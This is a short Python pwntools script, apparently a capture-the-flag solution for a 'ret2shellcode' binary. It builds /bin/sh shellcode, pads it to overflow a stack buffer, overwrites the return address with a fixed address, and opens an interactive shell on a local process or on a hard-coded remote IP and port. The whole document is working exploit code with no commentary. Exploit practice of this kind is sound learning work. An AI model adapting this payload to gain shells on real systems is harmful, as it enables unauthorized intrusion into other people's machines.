from pwn import *
debug = True
#context.log_level = "debug"
sysbinsh = 0x0804863A
if debug:
	io = process("./ret2shellcode")
else:
	io = remote("47.75.182.113", 9999)

shellcode = asm(shellcraft.sh())
esp_addr = 0xffffd1d0
char_addr = esp_addr + 0x1C
ebp_addr = 0xffffd258
char_num = ebp_addr-char_addr
ret_addr = 0x0804A080
print shellcode.ljust(char_num, 'A')
payload = ""
payload += shellcode.ljust(char_num, 'A')
payload += "junk"
payload += p32(ret_addr)
io.sendline(payload)
io.interactive()



